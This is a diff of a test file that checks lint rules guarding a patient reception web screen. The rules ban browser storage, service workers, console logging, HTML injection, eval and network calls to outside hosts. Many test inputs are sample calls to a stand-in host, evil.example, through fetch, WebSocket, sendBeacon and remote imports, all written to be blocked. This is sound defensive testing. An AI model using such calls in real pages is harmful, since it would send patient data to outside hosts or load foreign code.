@@ -927,3 +927,141 @@ describe('AC-013.7 청구 화면 폴더: 오류 보고 패키지 금지', SLOW, 
     expect(names.filter((name) => /^@sentry\/|^@vercel\/(analytics|speed-insights)$/.test(name))).toEqual([])
   })
 })
+
+describe('AC-1407.6 접수 현황 화면 코드(reception/www/**): 저장소·서비스 워커·console·HTML 넣기·eval·바깥 주소 fetch 금지', SLOW, () => {
+  // reception/www/는 아직 없다(TASK-16이 만든다). 경로만 빌려 그 자리에 걸린 규칙을 본다
+  const WWW = 'reception/www/probe.js'
+
+  it.each([
+    // 브라우저 저장소: 휴대폰에 환자 자료가 남는다
+    ["localStorage.setItem('k', 'v')", 'no-restricted-globals'],
+    ["sessionStorage.setItem('k', 'v')", 'no-restricted-globals'],
+    ["indexedDB.open('k')", 'no-restricted-globals'],
+    ["caches.open('k')", 'no-restricted-globals'],
+    ["window.localStorage.setItem('k', 'v')", 'no-restricted-properties'],
+    ["globalThis.sessionStorage.getItem('k')", 'no-restricted-properties'],
+    ["self.indexedDB.open('k')", 'no-restricted-properties'],
+    ["window.caches.open('k')", 'no-restricted-properties'],
+    ['const { localStorage: s } = window\nexport { s }', 'no-restricted-properties'],
+    ["document.cookie = 'k=v'", 'no-restricted-properties'],
+    // 서비스 워커: 쓰면 환자 화면이 휴대폰에 남는다
+    ["navigator.serviceWorker.register('/sw.js')", 'no-restricted-properties'],
+    ["window.navigator.serviceWorker.register('/sw.js')", 'no-restricted-properties'],
+    ['const { serviceWorker } = navigator\nexport { serviceWorker }', 'no-restricted-properties'],
+    // console: 환자 자료가 로그에 남는다
+    ['console.log(1)', 'no-console'],
+    ['globalThis.console.log(1)', 'no-restricted-properties'],
+    ['const c = console\nc.log(1)', 'no-restricted-globals'],
+    // HTML로 넣기: 환자 글은 textContent로만
+    ['export const put = (el, name) => { el.innerHTML = name }', 'no-restricted-properties'],
+    ['export const put = (el, name) => { el.outerHTML = name }', 'no-restricted-properties'],
+    ["export const put = (el, name) => el.insertAdjacentHTML('beforeend', name)", 'no-restricted-properties'],
+    ["export const put = (el, name) => { el['innerHTML'] = name }", 'no-restricted-properties'],
+    ['export const put = (name) => document.write(name)', 'no-restricted-properties'],
+    ['export const put = (name) => document.writeln(name)', 'no-restricted-properties'],
+    ['export const put = (name) => window.document.write(name)', 'no-restricted-properties'],
+    // 글자를 코드로 돌리기
+    ["eval('1')", 'no-restricted-globals'],
+    ["window.eval('1')", 'no-restricted-properties'],
+    ["new Function('return 1')", 'no-restricted-globals'],
+    ["Function('return 1')()", 'no-restricted-globals'],
+    ["new globalThis.Function('return 1')", 'no-restricted-properties'],
+    ["setTimeout('location.reload()', 10)", 'no-implied-eval'],
+    // 바깥 주소로 묻기: fetch 첫 인자는 '/'로 시작하는 글자(또는 '/'로 시작하는 틀 글자)만
+    ["fetch('http://evil.example/api')", 'no-restricted-syntax'],
+    ["fetch('https://evil.example/api')", 'no-restricted-syntax'],
+    ["fetch('//evil.example/api')", 'no-restricted-syntax'],
+    ["fetch('api/board')", 'no-restricted-syntax'],
+    ["fetch('/\\\\evil.example/api')", 'no-restricted-syntax'],
+    ["fetch('/\\t/evil.example/api')", 'no-restricted-syntax'],
+    ['export const f = (host) => fetch(`//${host}/api`)', 'no-restricted-syntax'],
+    ['export const f = (host) => fetch(`https://${host}/api`)', 'no-restricted-syntax'],
+    ['export const f = (path) => fetch(`/${path}`)', 'no-restricted-syntax'],
+    ['export const f = (url) => fetch(url)', 'no-restricted-syntax'],
+    ["fetch(new Request('https://evil.example/api'))", 'no-restricted-syntax'],
+    ['fetch()', 'no-restricted-syntax'],
+    ["window.fetch('/api/board')", 'no-restricted-properties'],
+    ["globalThis.fetch('/api/board')", 'no-restricted-properties'],
+    ["const f = fetch\nf('https://evil.example/api')", 'no-restricted-syntax'],
+    ["fetch.call(null, 'https://evil.example/api')", 'no-restricted-syntax'],
+    // fetch 말고 다른 길로 묻기
+    ['new XMLHttpRequest()', 'no-restricted-globals'],
+    ["new WebSocket('ws://evil.example')", 'no-restricted-globals'],
+    ["new EventSource('https://evil.example')", 'no-restricted-globals'],
+    ["navigator.sendBeacon('https://evil.example', 'x')", 'no-restricted-properties'],
+    // 바깥에서 코드 받기: 같은 폴더 파일(./…)만 불러온다
+    ["import x from 'https://evil.example/x.js'\nexport { x }", 'no-restricted-syntax'],
+    ["export * from 'https://evil.example/x.js'", 'no-restricted-syntax'],
+    ["export const load = () => import('https://evil.example/x.js')", 'no-restricted-syntax'],
+    ['export const load = (name) => import(name)', 'no-restricted-syntax'],
+  ])('AC-1407.6: %s → %s', async (code, rule) => {
+    expect(await errorRules(code, WWW)).toContain(rule)
+  })
+
+  it('AC-1407.6: 하위 폴더·.mjs도 같은 울타리 아래 있다', async () => {
+    expect(await errorRules("localStorage.setItem('k', 'v')", 'reception/www/sub/probe.js')).toContain('no-restricted-globals')
+    expect(await errorRules("fetch('https://evil.example')", 'reception/www/probe.mjs')).toContain('no-restricted-syntax')
+  })
+
+  it('AC-1407.6: 같은 PC에 묻기(fetch("/…"))·textContent·같은 폴더 import·화면 API는 된다', async () => {
+    const code = [
+      "import { el } from './dom.js'",
+      "import { draw } from '../www/board.js'",
+      'export async function getBoard({ fresh } = {}) {',
+      '  const controller = new AbortController()',
+      '  const timer = setTimeout(() => controller.abort(), 5000)',
+      '  try {',
+      "    const res = await fetch(`/api/board${fresh ? '?fresh=1' : ''}`, { signal: controller.signal, cache: 'no-store' })",
+      '    return res.ok ? await res.json() : null',
+      '  } finally {',
+      '    clearTimeout(timer)',
+      '  }',
+      '}',
+      'export const getHistory = (k, from) => fetch(`/api/history?k=${encodeURIComponent(k)}&from=${from}`)',
+      "export const setXray = (k, on) => fetch('/api/xray', { method: 'POST', body: JSON.stringify({ k, on }) })",
+      "export const ping = () => fetch('/')",
+      'export function row(name) {',
+      "  const node = document.createElement('div')",
+      '  node.textContent = name',
+      "  node.append(el('span', {}, [name]))",
+      "  document.title = '접수 현황'",
+      "  location.hash = '#/v/' + name",
+      "  navigator.vibrate?.(200)",
+      "  return matchMedia('(min-width: 1000px)').matches ? draw(node) : node",
+      '}',
+    ].join('\n')
+    expect(await lint(code, WWW)).toEqual([])
+  })
+
+  it('AC-1407.6: 안내는 무엇을 쓸 수 없는지 말한다', async () => {
+    const say = async (code: string) => (await lint(code, WWW)).map((m) => m.message).join('\n')
+    expect(await say("localStorage.setItem('k', 'v')")).toContain('브라우저 저장소')
+    expect(await say("navigator.serviceWorker.register('/sw.js')")).toContain('서비스 워커')
+    expect(await say('export const put = (el, name) => { el.innerHTML = name }')).toContain('textContent')
+    expect(await say("fetch('https://evil.example')")).toContain("'/'로 시작")
+  })
+
+  it('AC-1407.6: 새 블록이 기존 금지(client.ts import)를 덮어 풀지 않는다', async () => {
+    const path = '../../src/lib/bridge/client'
+    expect(await errorRules(`import { connectBridge } from '${path}'\nexport { connectBridge }`, WWW)).toContain(
+      'no-restricted-imports',
+    )
+    expect(await errorRules(`export const load = () => import('${path}')`, WWW)).toContain('no-restricted-syntax')
+  })
+
+  it('AC-1407.6: 울타리는 reception/www만이다. 화면 시험(reception/tests)은 가짜 fetch를 넣을 수 있다', async () => {
+    const code = "globalThis.fetch = async () => new Response('{}')\nexport const url = 'https://evil.example'"
+    const rules = await errorRules(code, 'reception/tests/api.test.ts')
+    expect(rules).not.toContain('no-restricted-properties')
+    expect(rules).not.toContain('no-restricted-syntax')
+  })
+
+  it('AC-1407.6: vitest가 화면 시험(reception/**/*.test.ts)을 잡고, Next 형 검사는 reception을 뺀다', () => {
+    const vitestConfig = readFileSync(fileURLToPath(new URL('../vitest.config.ts', import.meta.url)), 'utf-8')
+    expect(vitestConfig).toContain("'reception/**/*.test.ts'")
+    const tsconfig = JSON.parse(readFileSync(fileURLToPath(new URL('../tsconfig.json', import.meta.url)), 'utf-8')) as {
+      exclude?: string[]
+    }
+    expect(tsconfig.exclude).toContain('reception')
+  })
+})
